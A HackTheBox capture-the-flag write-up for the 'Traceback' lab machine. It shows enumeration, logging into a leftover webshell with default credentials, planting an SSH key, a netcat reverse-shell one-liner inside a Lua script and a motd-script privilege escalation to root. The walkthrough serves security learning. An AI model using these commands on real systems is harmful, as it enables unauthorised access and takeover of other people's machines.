---
title: Writeup - HackTheBox - Traceback
published: true
---
Someone did hack this machine before and left a webshell on the
webserver. I use this webshell to get access to the webadmin user
account. From the user webadmin I could escalate to the sysadmin
user account through a lua script. The sysadmin can write to the
motd, wich runs as root. By taking advantage of that I was able to
get root access.

## [](#header-2)Enumeration

### [](#header-3)Nmap
I started with an nmap scan to get a list of running services on
the machine.

```
Nmap -sC -sV -oA nmap/nmap 10.10.10.181
```

![](Pictures/Traceback/nmap.png)

There is only two ports open, 22 and 80. I was looking at the
website that the webserver is hosting and noticed that this server
probably have been hacked.

![](Pictures/Traceback/website1.png)

The hacker left a note that he left a backdoor. By looking at the
source code I got some more information.

```
<center>
<h1>This site has been owned</h1>
<h2>I have left a backdoor for all the net. FREE
INTERNETZZZ</h2>
<h3> - Xh4H - </h3>
<!--Some of the best web shells that you might need ;)-->
</center>
```

With this information I just did a google search.

```
google <!--Some of the best web shells that you might need ;)-->
```

It got me to a GitHub page with different webshells.

![](Pictures/Traceback/webshells.png)

I saved the names of all the webshells into a file, list.txt.

![](Pictures/Traceback/list.png)


## [](#header-2)Exploitation

### [](#header-3)Gobuster
With the use of gobuster together with the list I got the
following result:

```
gobuster dir -w list.txt -u http://10.10.10.181 -x php
```

![](Pictures/Traceback/gobuster.png)

The tool got a hit on smevk.php. By taking a look at the following
site http://10.10.10.181/smevk.php I was presented with this:

![](Pictures/Traceback/website2.png)

I needed some credentials to be able to log in. I went back to the
GitHub page and looked through some of the shell code and found
the default login credentials.

```
$deface_url = 'http://pastebin.com/raw.php?i=FHfxsFGT';
url here(pastebin).
//deface
$UserName = "admin"; //Your UserName here.
$auth_pass = "admin"; //Your Password.
//Change Shell Theme here//
$color = "#8B008B"; //Fonts color modify here.
$Theme = '#8B008B';
accoriding to your choice. //Change border-color
$TabsColor = '#0E5061'; //Change tabs color here.
```

### [](#header-3)The access
I made the assumption that the default login credentials had not
been changed, and I was right, I was able to login.

![](Pictures/Traceback/loggedin.png)

From here I got an interface with access to the under laying
system as the user webadmin. By looking around I figured out that
I can access the webadmin’s home folder. In the folder
/home/webadmin/.ssh/ I put my own ssh pub key from my Kali system
into the file authorized_keys.

```
ssh-keygen -t rsa
```

![](Pictures/Traceback/pub.png)

### [](#header-3)User access as webadmin
I was now able to login to the system as webadmin without a
password.

```
ssh webadmin@10.10.10.181
```

![](Pictures/Traceback/shell1.png)

Here is more tracks from the former hacker.
I started with some enumeration of the user webadmin and found a
note in the home folder, note.txt.

```
- sysadmin -
I have left a tool to practice Lua.
I'm sure you know where to find it.
Contact me if you have any question.
```

### [](#header-3)Lua scripting
Lua is a scripting language.
I didn’t know where look for this tool, so I did some more
enumeration. When I was looking if I had some sudo privileges on
the system I found this:

```
sudo -l
```

![](Pictures/Traceback/sudo-l.png)

This tells me that I can run luvit in the user sysadmin’s
homefolder as the user sysadmin.

![](Pictures/Traceback/lua-poc.png)

I had never written anything with Lua before but I was able to do
a quick test of my privileges as sysadmin. I put the following
code in a file, script.lua, in the /tmp folder and then I ran
luvit as the user sysadmin.

```
os.execute('ls -la /home/sysadmin/> /tmp/ls')
```

![](Pictures/Traceback/lua1.png)

This worked and I got a listing of the content in sysadmin’s home
folder. My next step was to edit the script that it would give me
a user shell as sysadmin.

### [](#header-3)User access as sysadmin
I found out that netcat was installed on the system and that got
me the idea of putting a reverse shell into the Lua script, using
netcat.

```
os.execute('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.6 1337 >/tmp/f')
```

By doing this I could get a shell back.
On my Kali machine I put up a listener with the same port as in
the script.

```
nc -lvnp 1337
```

I ran the Lua script in the same was as before and I got a shell
back as the user sysadmin.
I was now able to get the user.txt flag.

![](Pictures/Traceback/user.png)

### [](#header-3)Root access
I did some enumeration and figured out by looking at running
processes that root updates the motd and I wonderd why. I took a
look inside the folder /etc/update-motd.d and found that the user
sysadmin can edit the motd files.

![](Pictures/Traceback/ls-motd.png)

I put the following line of code inside of the 00-header file:

```
echo "cat /root/root.txt" >> /etc/update-motd.d/00-header
```

When I logged back into the system with the user webadmin I got
the root.txt flag.

![](Pictures/Traceback/root.png)

Here the root.txt flag is blurred out.

